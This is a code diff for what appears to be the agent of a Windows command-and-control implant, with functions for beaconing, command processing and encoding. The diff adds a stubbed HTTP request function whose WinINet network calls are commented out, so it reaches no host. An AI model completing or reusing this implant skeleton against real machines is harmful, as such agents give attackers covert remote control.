@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <wininet.h>
 #include <tlhelp32.h>
 #include "log.h"
 
@@ -32,6 +33,10 @@ struct {
     CHAR*   name;
     CHAR    arch[MAX_PATH];
 } info;
+
+struct {
+    int     count;
+} beacon;
 
 CHAR* encode(CHAR* data_to_encode, DWORD data_to_encode_length) {
     DWORD encoded_data_length = strlen(data_to_encode) * 2;
@@ -100,6 +105,34 @@ void process_command(CHAR* command, CHAR* input) {
     cleanup:
         free(input);
         free(output);
+}
+
+void http_request() {
+    //HINTERNET h_internet;
+    //HINTERNET h_connect;
+    //HINTERNET h_request;
+    CHAR* response = NULL;
+    //CHAR* query_buffer = NULL;
+    //DWORD dw_error = GetLastError();
+
+    log_debug("Sending request for ", data.status);
+    beacon.count++;
+
+    goto process_response;
+
+    process_response:
+        if (beacon.count <= 1) {
+            goto cleanup;
+        } else {
+            goto cleanup;
+        }
+
+    cleanup:
+        free(data.buffer);
+        free(response);
+        //InternetCloseHandle(h_internet);
+        //InternetCloseHandle(h_connect);
+        //InternetCloseHandle(h_request);
 }
 
 void agent_beacon() {
